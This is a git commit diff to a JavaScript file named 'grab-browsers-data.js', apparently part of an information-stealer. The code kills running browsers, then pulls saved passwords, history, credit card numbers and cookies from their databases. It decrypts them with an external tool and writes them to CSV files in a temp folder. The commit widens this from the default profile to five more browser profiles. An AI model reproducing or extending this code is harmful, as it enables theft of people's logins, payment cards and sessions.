f73fccb69f81e1858ccdbdc814a1c8c1a016739d
Yuuto <thelio.trinite@outlook.com>
2023-04-16 17:04:03 +0200

    profile

--- functions/grab-browsers-data.js
+++ functions/grab-browsers-data.js
@@ -27,10 +27,10 @@ const toolPath = runningFromExecutable() ?
  * @param {string} use
  * @param {string} filename
  * @param {(dbFile: string, csvFile: string) => void} dbData
- * @private
+ * @param {string} [profile]
  */
-const _ = (name, path, use, filename, dbData) => {
-  path += join(sep, 'Default', use);
+const _ = (name, path, use, filename, dbData, profile = 'Default') => {
+  path += join(sep, profile, use);
   if (!existsSync(path)) return;
 
   if (!existsSync(join(tempFolder, 'Browsers', name))) mkdirSync(join(tempFolder, 'Browsers', name));
@@ -42,43 +42,43 @@ const _ = (name, path, use, filename, dbData) => {
   dbData(dbFile, file);
 };
 
-this.passwords = (name, path) => {
-  return _(name, path, 'Login Data', 'Logins', (dbFile, csvFile) => execSync(
+this.passwords = (name, path, profile) => {
+  return _(name, path, 'Login Data', 'Logins', (dbFile, csvFile) => exec(
     [
       toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT origin_url, username_value, password_value FROM logins"',
       `--csv-file "${csvFile}"`, '--rows "url,username,password"', '--decrypt-row 2'
     ].join(' ')
-  ));
+  ), profile);
 };
 
-this.history = (name, path) => {
-  return _(name, path, 'History', 'History', (dbFile, csvFile) => execSync(
+this.history = (name, path, profile) => {
+  return _(name, path, 'History', 'History', (dbFile, csvFile) => exec(
     [
       toolPath, `--path "${path}"`, `--db-file "${dbFile}"`, '--sql "SELECT url, title, visit_count, typed_count FROM urls"',
       `--csv-file "${csvFile}"`, '--rows "url,title,visit count,typed count"'
     ].join(' ')
-  ));
+  ), profile);
 };
 
-this.creditCards = (name, path) => {
-  return _(name, path, 'Web Data', 'Credit Cards', (dbFile, csvFile) => execSync(
+this.creditCards = (name, path, profile) => {
+  return _(name, path, 'Web Data', 'Credit Cards', (dbFile, csvFile) => exec(
     [
       toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
       '--sql "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"',
       `--csv-file "${csvFile}"`, '--rows "name on card,expiration month,expiration year,card number"', '--decrypt-row 3'
     ].join(' ')
-  ));
+  ), profile);
 };
 
-this.cookies = (name, path) => {
-  return _(name, path, join('Network', 'Cookies'), 'Cookies', (dbFile, csvFile) => execSync(
+this.cookies = (name, path, profile) => {
+  return _(name, path, join('Network', 'Cookies'), 'Cookies', (dbFile, csvFile) => exec(
     [
       toolPath, `--path "${path}"`, `--db-file "${dbFile}"`,
       '--sql "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly, has_expires, is_persistent, samesite, source_port FROM cookies"',
       `--csv-file "${csvFile}"`, '--rows "host,name,value,path,is secure,is httponly,has expires,is persistent,samesite,port"',
       '--decrypt-row 2'
     ].join(' ')
-  ));
+  ), profile);
 };
 
 const kill = (browser, onKilled) => {
@@ -98,7 +98,10 @@ browsers.forEach((browser) => {
     // Kill browser process
     kill(browser[0], () => {
       ['passwords', 'history', 'creditCards', 'cookies']
-        .forEach(fn => this[fn](browser[1].join(' '), path));
+        .forEach(fn => {
+          ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
+            .forEach(profile => this[fn](browser[1].join(' '), path, profile));
+        });
     });
   }
 });
